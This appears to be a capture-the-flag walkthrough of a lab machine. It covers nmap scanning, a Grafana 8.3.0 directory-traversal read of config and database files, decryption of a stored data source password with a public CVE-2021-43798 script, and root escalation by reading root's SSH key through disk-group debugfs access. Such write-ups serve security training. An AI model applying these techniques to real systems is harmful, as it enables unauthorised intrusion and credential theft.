# Fantastic

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.208.181                       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 16:49 +08
Warning: 192.168.208.181 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.208.181
Host is up (0.18s latency).
Not shown: 65412 closed tcp ports (conn-refused), 121 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

### Grafana LFI + Decrypt Password --> SSH Creds

Port 3000 was running Grafana:

<figure><img src="../../../.gitbook/assets/image (2327).png" alt=""><figcaption></figcaption></figure>

This particular version had an LFI exploit:

```
$ searchsploit grafana 8.3.0 
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Rea | multiple/webapps/50581.py
----------------------------------------------------------- ---------------------------------
```

I verified that it works:

<figure><img src="../../../.gitbook/assets/image (2306).png" alt=""><figcaption></figcaption></figure>

Since we don't have Grafana credentials, let's try to read it at `/etc/grafana/grafana.ini`. I found this within the configuration files:

```
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db
```

We can attempt to read the Grafana database from that folder. I copied the output to a file, and checked for instances of `admin`:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

I also found this within it:

{% code overflow="wrap" %}
```
{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}HkdQ8Ganz
```
{% endcode %}

This was an encoded password. Googling how to decrypt this led me to another Github repository:

{% embed url="https://github.com/jas502n/Grafana-CVE-2021-43798/tree/main" %}

To abuse this, replace the secret Key and encrypted password within the script:

```
var grafanaIni_secretKey = "SW2YcwTIb9zpOOhoPsMm"
var dataSourcePassword = "anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="
```

Afterwards, make sure that `go` has the `golang.org/x/crypto/pbkdf2@latest` module installed. This would let us decrypt the password:

<figure><img src="../../../.gitbook/assets/image (2332).png" alt=""><figcaption></figcaption></figure>

With the password, I tested Grafana and SSH, and it worked for the `sysadmin` user:

<figure><img src="../../../.gitbook/assets/image (2313).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Disk Group --> Read SSH Key

We are part of the `disk` group, meaning we actually have full access to the file system through `debugfs`. First, let's check the different devices available:

```
sysadmin@fanatastic:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.1M   97M   2% /run
/dev/sda2       9.8G  5.7G  3.7G  61% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop0       71M   71M     0 100% /snap/lxd/21029
/dev/loop1       56M   56M     0 100% /snap/core18/2284
/dev/loop2       62M   62M     0 100% /snap/core20/1328
/dev/loop3       68M   68M     0 100% /snap/lxd/21835
/dev/loop4       56M   56M     0 100% /snap/core18/2128
/dev/loop5       33M   33M     0 100% /snap/snapd/12883
/dev/loop6       44M   44M     0 100% /snap/snapd/14549
tmpfs            98M     0   98M   0% /run/user/1001
```

`/dev/sda2` is obviously the main file system. We can then grab the `root` user's private SSH key:

<figure><img src="../../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

Then, we can `ssh` in as `root`:

<figure><img src="../../../.gitbook/assets/image (2305).png" alt=""><figcaption></figcaption></figure>
